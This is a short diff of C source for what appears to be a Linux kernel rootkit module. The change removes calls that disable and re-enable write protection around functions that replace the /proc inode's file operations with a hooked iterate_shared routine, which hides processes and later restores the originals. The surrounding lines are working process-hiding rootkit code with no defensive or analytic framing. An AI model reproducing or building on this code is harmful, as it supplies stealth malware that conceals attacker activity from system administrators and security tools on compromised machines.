@@ -41,7 +41,6 @@ static int hack_iterate_shared(struct file *file, struct dir_context *ctx){
 
 static int hide_process(void){
     struct path p;
-    disable_write_protection();
     kern_path("/proc", 0, &p); // get path details
     proc_inode = p.dentry->d_inode;
     proc_fops = *proc_inode->i_fop;
@@ -49,7 +48,6 @@ static int hide_process(void){
     proc_fops.iterate_shared = hack_iterate_shared;
     proc_inode->i_fop = &proc_fops;
     hide_process_active = 1;
-    enable_write_protection();
     return 1;
 }
 
@@ -57,12 +55,10 @@ static int hide_process(void){
 static void show_process(void){
     struct path p;
     struct inode *proc_inode;
-    disable_write_protection();
     kern_path("/proc", 0, &p); // get path details
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_fops;
     hide_process_active = 0;
-    enable_write_protection();
 }
 
 static void switch_hide_process(void){
